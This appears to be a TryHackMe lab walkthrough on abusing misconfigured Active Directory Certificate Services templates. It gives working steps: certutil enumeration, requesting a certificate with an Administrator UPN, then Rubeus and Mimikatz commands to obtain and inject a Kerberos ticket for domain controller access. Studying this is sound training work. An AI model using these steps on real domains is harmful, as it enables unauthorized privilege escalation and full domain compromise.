# Exploiting Active Directory Certificate Services

Now that we have access to **THMSERVER2**, we've advanced our exploitation of Active Directory (AD) by compromising all Tier 1 assets (servers). However, to move to the next tier, we need to find more creative attack paths.

Research by SpecterOps (see their [whitepaper](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)) demonstrated that misconfigured certificate templates can be abused for privilege escalation and lateral movement. If you want to better understand certificate misconfigurations and how to identify them, check out the referenced room.

---

## AD Certificate Services (AD CS)

**AD CS** is Microsoft's Public Key Infrastructure (PKI) implementation. Since AD provides organizational trust, it can act as a Certificate Authority (CA) to prove and delegate trust. AD CS is used for:

- Encrypting file systems
- Creating and verifying digital signatures
- User authentication

Because AD CS is privileged, it typically runs on selected domain controllers. Normal users can't interact with it directly, but organizations are often too large for admins to manually create and distribute every certificate. **Certificate templates** allow admins to define who can request certificates and under what conditions. SpecterOps found that certain parameter combinations in these templates can be abused for privilege escalation and persistence.

---

## Key Terminology

- **PKI**: Public Key Infrastructure, manages certificates and public key encryption.
- **AD CS**: Active Directory Certificate Services, Microsoft's PKI implementation.
- **CA**: Certificate Authority, issues certificates.
- **Certificate Template**: Defines how and when a certificate may be issued by a CA.
- **CSR**: Certificate Signing Request, sent to a CA to request a signed certificate.
- **EKU**: Extended/Enhanced Key Usage, defines how a certificate may be used.

---

## Finding Vulnerable Certificate Templates

To find vulnerable templates, use Windows' built-in tool `certutil`. On **THMSERVER2** (via RDP), run:

```powershell
certutil -Template -v > templates.txt
```

Alternatively, use tools like Ghostpack's **PSPKIAudit**. Manual review ensures you catch all misconfigurations. A template is vulnerable if it allows:

- **Client Authentication**: Certificate can be used for client authentication.
- **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT**: Allows specifying the Subject Alternative Name (SAN).
- **CTPRIVATEKEY_FLAG_EXPORTABLE_KEY**: Certificate is exportable with the private key.
- **Certificate Permissions**: You have permission to use the template.

For more on these combinations, see the SpecterOps whitepaper. In this scenario, **Template[32]** is vulnerable, allowing the THMSERVER2 machine account to issue a CSR with a custom SAN for client authentication.

SpecterOps lists eight common AD CS misconfigurations—many more may exist.

---

## Exploiting a Certificate Template

With RDP access on **THMSERVER2**, request a certificate:

1. **Open MMC**:
    - Start → Run → `mmc`
    - File → Add/Remove Snap-in...
    - Add "Certificates" snap-in (select "Computer Account" and "Local computer")
2. **Request a Certificate**:
    - Right-click "Personal" → All Tasks → Request New Certificate...
    - Click Next twice (select AD enrollment policy)
    - Click the "More Information" warning
    - Set Subject name Type to "Common Name" (any value)
    - Set Alternative name Type to "User principal name" (UPN of target user, e.g., `Administrator@za.tryhackme.loc`)
    - Click Add, Apply, and OK
    - Select the certificate and click Enroll

3. **Export the Certificate with Private Key**:
    - Right-click the certificate → All Tasks → Export...
    - Select "Yes, export the private key"
    - Set a password and choose a save location

---

## User Impersonation via Certificate

To impersonate a user:

1. **Request a Kerberos TGT using Rubeus**:

   ```powershell
   Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:<path_to_certificate> /password:<cert_password> /outfile:<output_file> /domain:za.tryhackme.loc /dc:<domain_controller_ip>
   ```

   - `/user`: UPN used in the certificate
   - `/enctype`: Encryption type (set for evasion)
   - `/certificate`: Path to the exported certificate
   - `/password`: Certificate file password
   - `/outfile`: Output file for the TGT
   - `/domain`: Target domain FQDN
   - `/dc`: Domain controller IP (preferably one running CA service)

   Example output:

   ```
   [+] TGT request successful!
   [*] base64(ticket.kirbi): <...>
   ```

2. **Load the TGT with Mimikatz**:

   ```powershell
   mimikatz # privilege::debug
   mimikatz # kerberos::ptt administrator.kirbi
   ```

   You should now have access as the impersonated user.

3. **Verify Access**:

   ```powershell
   dir \\THMDC.za.tryhackme.loc\c$\
   ```

   You should see the contents of the domain controller's C$ share.

---

## Conclusion

By exploiting misconfigured certificate templates in AD CS, we've escalated privileges and gained access to Tier 0 infrastructure, compromising the full child domain.

